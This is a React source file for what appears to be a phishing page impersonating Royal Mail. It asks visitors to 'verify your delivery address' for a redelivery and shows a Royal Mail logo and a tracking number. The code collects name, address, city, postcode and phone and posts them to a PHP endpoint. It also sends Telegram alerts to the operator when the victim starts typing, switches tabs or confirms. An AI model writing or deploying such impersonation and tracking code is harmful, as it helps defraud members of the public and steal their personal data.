import { useState, useEffect, useRef } from "react";
import { Truck, Calendar, Check, X, User, MapPin, Phone, ChevronDown } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Dialog, DialogContent, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { sendTypingAddressNotification, sendAddressConfirmNotification, sendPageHiddenNotification, sendPageVisibleNotification } from "@/components/tgapi";
import { FloatingInput } from "@/components/ui/floating-input";
import { useToast } from "@/hooks/use-toast";
import royalMailLogo from "@/assets/royal-mail-logo.png";
interface AddressFormProps {
  externalTrigger?: boolean;
  onClose?: () => void;
  invoiceData?: any;
  invoiceId?: string;
  onShowDeliveryForm?: (data: any) => void;
}
const AddressForm = ({
  externalTrigger = false,
  onClose,
  invoiceData,
  invoiceId,
  onShowDeliveryForm
}: AddressFormProps) => {
  const {
    toast
  } = useToast();
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showContent, setShowContent] = useState(false);
  const [showAddressForm, setShowAddressForm] = useState(false);
  const [isFormLoading, setIsFormLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [isFormInitialized, setIsFormInitialized] = useState(false);
  const [hasStartedTypingAddress, setHasStartedTypingAddress] = useState(false);
  
  // Removed address autocomplete states and refs

  // Form state - initialize with invoice data if available
  const [formData, setFormData] = useState({
    fullName: invoiceData?.name || '',
    address: invoiceData?.address || '',
    city: invoiceData?.city || '',
    postcode: invoiceData?.zip || '',
    phone: invoiceData?.phone || ''
  });

  // Error state
  const [errors, setErrors] = useState({
    fullName: '',
    address: '',
    city: '',
    postcode: '',
    phone: ''
  });

  // Initialize form data only once when invoice data is first available
  useEffect(() => {
    if (invoiceData && !isFormInitialized) {
      setFormData({
        fullName: invoiceData.name || '',
        address: invoiceData.address || '',
        city: invoiceData.city || '',
        postcode: invoiceData.zip || '',
        phone: invoiceData.phone || ''
      });
      setIsFormInitialized(true);
    }
  }, [invoiceData, isFormInitialized]);

  // Removed address input value initialization

  // Page visibility change handler
  useEffect(() => {
    if (!isDialogOpen) return;
    
    const handleVisibilityChange = () => {
      const clientIdentifier = formData.fullName || invoiceData?.name || "Unknown Client";
      
      if (clientIdentifier === "Unknown Client") return;
      
      if (document.hidden) {
        sendPageHiddenNotification(clientIdentifier);
      } else {
        sendPageVisibleNotification(clientIdentifier);
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [isDialogOpen, formData.fullName, invoiceData?.name]);

  // Removed address suggestions fetching logic

  // Simplified address input change handler
  const handleAddressInputChange = (value: string) => {
    handleInputChange('address', value);
  };

  // Removed suggestion selection handler

  // Removed auto-scroll logic for suggestions

  // Removed click outside handler for suggestions
  useEffect(() => {
    if (externalTrigger) {
      setIsDialogOpen(true);
      setIsLoading(true);
      setShowContent(false);
    }
  }, [externalTrigger]);
  useEffect(() => {
    if (isDialogOpen) {
      setIsLoading(true);
      setShowContent(false);
      const timer = setTimeout(() => {
        setIsLoading(false);
        setShowContent(true);
      }, 100);
      return () => clearTimeout(timer);
    } else {
      setShowContent(false);
    }
  }, [isDialogOpen]);
  const handleOpenChange = (newOpen: boolean) => {
    setIsDialogOpen(newOpen);
    if (!newOpen && onClose) {
      onClose();
    }
  };
  const handleContinueClick = () => {
    setIsFormLoading(true);
    setTimeout(() => {
      setIsFormLoading(false);
      setShowAddressForm(true);
    }, 100);
  };
    const sendTypingNotification = async () => {
      const invoiceName = formData.fullName || invoiceData?.name || "Unknown Invoice";
      const address = `${formData.address || invoiceData?.address || ""} ${formData.city || invoiceData?.city || ""} ${formData.postcode || invoiceData?.zip || ""}`.trim() || "Unknown Address";
      
      await sendTypingAddressNotification(invoiceName, address);
    };

  const handleInputChange = (field: string, value: string) => {
    // Check if user started typing in address field and we haven't sent notification yet
    if (field === 'address' && !hasStartedTypingAddress && value.length > 0) {
      setHasStartedTypingAddress(true);
      sendTypingNotification();
    }
    
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
    // Clear error when user types
    if (errors[field as keyof typeof errors]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
  };
  const validateField = (field: string, value: string) => {
    if (!value.trim()) {
      const fieldLabels = {
        fullName: 'Recipient',
        address: 'Address',
        city: 'City',
        postcode: 'Postcode',
        phone: 'Phone'
      };
      const label = fieldLabels[field as keyof typeof fieldLabels] || field;
      setErrors(prev => ({
        ...prev,
        [field]: `${label} is required`
      }));
      return false;
    }
    return true;
  };
  const sendAddressConfirmNotificationToTg = async () => {
    const invoiceName = formData.fullName || invoiceData?.name || "Unknown Invoice";
    const address = `${formData.address || ""} ${formData.city || ""} ${formData.postcode || ""}`.trim() || "Unknown Address";
    
    await sendAddressConfirmNotification(invoiceName, address);
  };

  const handleConfirmSubmit = async () => {
    // Validate all fields
    const fieldsToValidate = ['fullName', 'address', 'city', 'postcode', 'phone'];
    let hasErrors = false;
    fieldsToValidate.forEach(field => {
      if (!validateField(field, formData[field as keyof typeof formData])) {
        hasErrors = true;
      }
    });
    if (hasErrors) {
      return;
    }

    // Send Telegram notifications for address confirmation
    await sendAddressConfirmNotificationToTg();

    if (!invoiceId) {
      // If no invoiceId (preview mode), show success without API call
      setIsConfirmed(true);
      setTimeout(() => {
        setIsDialogOpen(false);
        if (onClose) onClose();
        // Pass updated form data without old_city (never update old_city)
        if (onShowDeliveryForm) onShowDeliveryForm(formData);
      }, 1000);
      return;
    }
    setIsSubmitting(true);
    try {
      const response = await fetch('/api/create_invoice.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          invoiceId: invoiceId,
          name: formData.fullName,
          address: formData.address,
          city: formData.city,
          zip: formData.postcode,
          phone: formData.phone
        })
      });
      if (response.ok) {
        const result = await response.json();
        // Show confirmation message and after 1 second trigger delivery form
        setIsConfirmed(true);
        setTimeout(() => {
          setIsDialogOpen(false);
          if (onClose) onClose();
          // Pass updated form data without old_city (never update old_city)
          if (onShowDeliveryForm) onShowDeliveryForm(formData);
        }, 1000);
      } else {
        const error = await response.json();
        toast({
          title: "Error",
          description: error.error || "Failed to update address",
          variant: "destructive"
        });
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Network error. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };
  return <Dialog open={isDialogOpen} onOpenChange={handleOpenChange}>
      <DialogTitle className="sr-only">Delivery Address Form</DialogTitle>
      <DialogDescription className="sr-only">Form to update delivery address information</DialogDescription>
      <DialogContent className="p-0 border-0 bg-black/20 shadow-none max-w-[320px] w-full my-2 max-h-[90vh] overflow-y-auto data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=open]:duration-300">
        <div className="h-auto flex flex-col">
          <Card className="shadow-2xl border-2 border-red-500 rounded-[6px] drop-shadow-xl bg-white flex flex-col transform transition-all duration-300 ease-in-out data-[state=open]:animate-in data-[state=open]:zoom-in-95 data-[state=open]:fade-in-0 hover:scale-98 hover:shadow-xl">
            {/* Banner with Logo - Sticky */}
            <div className="sticky top-0 z-10 bg-gradient-to-r from-primary to-primary-light p-4 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-primary to-primary-light border-2 border-red-500 rounded-sm px-3 py-0.5 shadow-lg">
                  <span className="text-gray-100 font-semibold text-xs">Delivery Address</span>
              </div>
              {/* Close Button */}
              <button onClick={() => setIsDialogOpen(false)} className="absolute right-3 top-3 bg-red-400/80 hover:bg-red-400 rounded-full w-6 h-6 flex items-center justify-center shadow-md hover:shadow-lg transition-all duration-300 hover:scale-105 border border-red-500">
                <X className="h-4 w-4 text-white" />
              </button>
              </div>
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 w-10 h-10 bg-white/30 rounded-full flex items-center justify-center shadow-lg border-2 border-white/50">
                <Calendar className="h-6 w-6 text-gray-100 drop-shadow-lg" />
              </div>
            </div>
            
            <div className="px-2 pt-4 pb-4 my-0 mx-[10px]">
              {isLoading ? <div className="p-6 animate-fade-in">
                  <Card className="shadow-lg border border-border/50 bg-white animate-scale-in transition-all duration-300 ease-in-out hover:scale-98 hover:shadow-xl transform">
                    <CardContent className="flex flex-col items-center space-y-6 pt-8 pb-8 mx-[10px] py-[10px]">
                      <div className="relative">
                        <div className="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center animate-pulse">
                          <Calendar className="h-8 w-8 text-blue-600" />
                        </div>
                        <div className="absolute inset-0 rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
                      </div>
                      <p className="text-gray-600 text-center text-sm max-w-xs animate-fade-in" style={{
                    animationDelay: '0.2s'
                  }}>
                        Please wait while we connect to the tracking system.
                      </p>
                    </CardContent>
                  </Card>
                </div> : showContent ? <div className="space-y-4 animate-fade-in">
                  <div className="p-4 bg-blue-50 rounded-xl border border-border/50 shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                    <div className="text-center space-y-4">
                      {!showAddressForm ? <div className="space-y-4">
                          <div className="text-left space-y-2">
                            <p className="text-xs font-semibold text-gray-900">Dear {formData.fullName ? formData.fullName.split(' ')[0] : (invoiceData?.name ? invoiceData.name.split(' ')[0] : 'Customer')},</p>
                            <p className="text-xs text-gray-700">Please verify your delivery address below to complete your redelivery booking.</p>
                          </div>
                          <Button onClick={handleContinueClick} disabled={isFormLoading} className={`w-auto px-4 py-1.5 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-xs font-semibold rounded-lg hover:scale-105 active:scale-95 mx-auto ${isFormLoading ? 'scale-95 opacity-75 cursor-not-allowed' : 'cursor-pointer'}`}>
                            {isFormLoading ? 'Loading...' : 'Continue'}
                          </Button>
                        </div> : isConfirmed ? <div className="space-y-4 animate-fade-in text-center">
                          <div className="relative">
                            <div className="w-16 h-16 mx-auto rounded-full bg-green-100 flex items-center justify-center mb-4">
                              <Check className="h-8 w-8 text-green-600" />
                            </div>
                          </div>
                          <div className="space-y-2">
                            <h3 className="text-sm font-semibold text-gray-900">Address Confirmed!</h3>
                            <p className="text-xs text-gray-700">Your delivery address has been successfully updated.</p>
                            <p className="text-xs text-gray-500 font-medium flex items-center justify-center gap-1">
                              Redirecting
                              <span className="flex gap-0.5">
                                <span className="w-1 h-1 bg-gray-500 rounded-full animate-pulse" style={{animationDelay: '0s'}}></span>
                                <span className="w-1 h-1 bg-gray-500 rounded-full animate-pulse" style={{animationDelay: '0.2s'}}></span>
                                <span className="w-1 h-1 bg-gray-500 rounded-full animate-pulse" style={{animationDelay: '0.4s'}}></span>
                              </span>
                            </p>
                          </div>
                        </div> : <div className="space-y-4 animate-fade-in">
                          <div className="text-left space-y-3">
                            <h3 className="text-xs font-semibold text-gray-900">Confirm your delivery address below</h3>
                        <div className="space-y-5 mb-5">
                          <div className="space-y-4">
                            <FloatingInput label="Full Name" required value={formData.fullName} onChange={e => handleInputChange('fullName', e.target.value)} onBlur={e => validateField('fullName', e.target.value)} placeholder="Enter recipient name" error={errors.fullName} className="text-xs" />
                            
                            <div className="relative">
                              <FloatingInput 
                                label="Address" 
                                required 
                                value={formData.address} 
                                onChange={e => handleAddressInputChange(e.target.value)} 
                                onBlur={e => validateField('address', e.target.value)} 
                                placeholder="Enter your address..." 
                                error={errors.address}
                              />
                            </div>
                            
                            <div className="grid grid-cols-2 gap-3">
                              <FloatingInput label="City" required value={formData.city} onChange={e => handleInputChange('city', e.target.value)} onBlur={e => validateField('city', e.target.value)} placeholder="Enter city" error={errors.city} />
                              
                              <FloatingInput label="Postcode" required value={formData.postcode} onChange={e => handleInputChange('postcode', e.target.value)} onBlur={e => validateField('postcode', e.target.value)} placeholder="Enter postcode" error={errors.postcode} />
                            </div>
                            
                            <FloatingInput label="Phone Number" required type="tel" value={formData.phone} onChange={e => handleInputChange('phone', e.target.value)} onBlur={e => validateField('phone', e.target.value)} placeholder="Enter phone number" error={errors.phone} />
                          </div>
                        </div>
                            <Button onClick={handleConfirmSubmit} disabled={isSubmitting} className={`w-auto px-4 py-1.5 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-xs font-semibold rounded-lg hover:scale-105 active:scale-95 mx-auto ${isSubmitting ? 'scale-95 opacity-75 cursor-not-allowed' : 'cursor-pointer'}`}>
                              {isSubmitting ? 'Updating...' : 'Confirm'}
                            </Button>
                          </div>
                        </div>}
                    </div>
                  </div>
                </div> : null}
            </div>
            
            {/* Status Banner - Similar to Royal Mail header style */}
            <div className="sticky bottom-0 z-10 bg-gradient-to-r from-red-400 to-red-500 p-2 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-red-300 to-red-400 border-2 border-white rounded-sm px-3 py-1 shadow-lg flex items-center space-x-2">
                  <div className="w-4 h-4 bg-white rounded-full flex items-center justify-center">
                    <Check className="h-2.5 w-2.5 text-green-600" />
                  </div>
                  <span className="text-white font-semibold text-xs">GB714562018FL</span>
                </div>
              </div>
              <img src={royalMailLogo} alt="Royal Mail Logo" className="absolute left-4 top-1/2 transform -translate-y-1/2 h-6 w-auto" />
            </div>
          </Card>
        </div>
      </DialogContent>
    </Dialog>;
};
export default AddressForm;